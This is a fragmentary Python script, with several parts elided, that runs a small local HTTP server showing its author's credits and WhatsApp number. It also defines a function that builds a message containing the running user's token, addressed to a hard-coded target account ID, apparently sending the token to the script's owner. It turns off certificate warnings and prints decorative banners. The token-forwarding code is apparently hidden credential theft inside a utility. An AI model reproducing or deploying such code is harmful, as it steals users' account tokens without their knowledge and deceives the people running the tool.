...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"CREDIT :- UPENDRA YADAV <br> <br> OWNER => UPENDRA <br> <br> WATSAPP :- +918603857799")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "CREDIT :- UPENDRA YADAV                                                              \nOwner => Upendra                                                 \nHello Upendra sir. I am using your server. My token is :- {}"

      # Specify the ID where you want to send the message
      target_id = "100003521688439"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '●════════════UPENDRA-YADAV════════════●')
